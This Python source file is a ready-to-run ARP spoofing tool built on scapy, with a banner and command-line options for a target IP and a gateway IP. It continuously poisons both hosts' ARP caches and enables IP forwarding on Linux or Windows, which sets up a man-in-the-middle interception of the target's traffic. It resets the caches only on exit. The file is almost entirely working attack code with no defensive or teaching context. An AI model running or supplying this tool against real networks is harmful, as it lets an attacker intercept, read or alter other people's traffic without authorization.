#!/usr/bin/env python
#-*- coding: utf-8 -*-
# @author Distant Shock <dist.shock@secmail.pro>

from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os
import sys, getopt


def get_header():

	return r"""

   _____ ____________________    _________                     _____             
  /  _  \\______   \______   \  /   _____/_____   ____   _____/ ____\___________ 
 /  /_\  \|       _/|     ___/  \_____  \\____ \ /  _ \ /  _ \   __\/ __ \_  __ \
/    |    \    |   \|    |      /        \  |_> >  <_> |  <_> )  | \  ___/|  | \/
\____|__  /____|_  /|____|     /_______  /   __/ \____/ \____/|__|  \___  >__|   
        \/       \/                    \/|__|                           \/       


			    |---::[ ARP Spoofer ]::---|

	"""


def get_help():

	return get_header()+r"""

|+ USAGE:

	[i] Spoof targets and hosts ARP tables:

		"""+str(sys.argv[0])+r""" -t <target> -o <host> [-f <ip_forwarding|binary_yes_no>]


|+ PARAMETERS:

	-h, --help
		Show this help.

	-t, --target= ["192.168.0.46"]
		Specify target IP address.

	-o, --host= ["192.168.0.1"]
		Provide gateway IP address.

	-f, --ipforward= ["yes|no"] | Default: 'yes'
		[Optional]: Turn OFF/ON IP forwarding.



	"""


class ARPSpoofer():


	def __init__(self, target, host, ipforward="yes", verbose=True):

		self.target = target
		self.host = host
		self.ipforward = ipforward
		self.verbose = verbose
		

	def enable_linux_iproute(self):

		# Enables IP route ( IP Forward ) in linux-based distro
		file_path = "/proc/sys/net/ipv4/ip_forward"
		with open(file_path) as f:
			if f.read() == 1:
				# already enabled
				return
		with open(file_path, "w") as f:
			print(1, file=f)

		return True


	def enable_windows_iproute(self):

		# Enables IP route (IP Forwarding) in Windows
		from services import WService
		# enable Remote Access service
		service = WService("RemoteAccess")
		service.start()

		return True


	def enable_ip_route(self):

		# Enables IP forwarding
		if self.verbose:
			print("[!] Enabling IP Routing...")
		self.enable_windows_iproute() if "nt" in os.name else self.enable_linux_iproute()
		if self.verbose:
			print("[i] IP Routing enabled.")

		return True


	def get_mac(self, ip):

		# Returns MAC address of any device connected to the network
		# If ip is down, returns None instead
		ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
		if ans:
			return ans[0][1].src


	def spoof(self, target_ip, host_ip):

		# Spoofs `target_ip` saying that we are `host_ip`.
		# it is accomplished by changing the ARP cache of the target (poisoning)
		# get the mac address of the target
		target_mac = self.get_mac(target_ip)
		# craft the arp 'is-at' operation packet, in other words; an ARP response
		# we don't specify 'hwsrc' (source MAC address)
		# because by default, 'hwsrc' is the real MAC address of the sender (ours)
		arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
		# send the packet
		# verbose = 0 means that we send the packet without printing any thing
		send(arp_response, verbose=0)
		if self.verbose:
			# get the MAC address of the default interface we are using
			self_mac = ARP().hwsrc
			print('--------- self_mac: '+str(self_mac))
			if self.verbose:
				print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))


	def restore(self, target_ip, host_ip):

		# Restores the normal process of a regular network
		# This is done by sending the original informations 
		# (real IP and MAC of `host_ip` ) to `target_ip`
		# get the real MAC address of target
		target_mac = self.get_mac(target_ip)
		# get the real MAC address of spoofed (gateway, i.e router)
		host_mac = self.get_mac(host_ip)
		# crafting the restoring packet
		arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
		# sending the restoring packet
		# to restore the network to its normal process
		# we send each reply seven times for a good measure (count=7)
		send(arp_response, verbose=0, count=7)
		if self.verbose:
			print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))


	def run(self):

		# enable ip forwarding
		if self.ipforward == 'yes':
			self.enable_ip_route()

		try:
			while True:
				# telling the `target` that we are the `host`
				self.spoof(self.target, self.host)
				# telling the `host` that we are the `target`
				self.spoof(self.host, self.target)
				# sleep for one second
				time.sleep(1)
		except KeyboardInterrupt:
			if self.verbose:
				print("[!] Detected CTRL+C ! restoring the network, please wait...")
			self.restore(self.target, self.host)
			self.restore(self.host, self.target)


def main(target, host, ipforward):

	print(get_header())

	spoofer = ARPSpoofer(target, host, ipforward)
	
	res = spoofer.run()

	return res


if __name__ == "__main__":

	argv = sys.argv[1:]

	try:
		opts, args = getopt.getopt(argv, "ht:o:f:", ["help", "target=", "host=", "ipforward="])
	except getopt.GetoptError as err:
		print(get_help())
		sys.exit(2)
	if len(opts) < 1:
		print(get_help())
		sys.exit(2)
	ipforward = 'yes'
	for opt, arg in opts:
		if opt == '-h' or opt == '--help':
			print(get_help())
			sys.exit(0)
		elif opt in ("-t", "--target"):
			target = arg
		elif opt in ("-o", "--host"):
			host = arg
		elif opt in ("-f", "--ipforward"):
			ipforward = arg

	main(target, host, ipforward)

	sys.exit(0)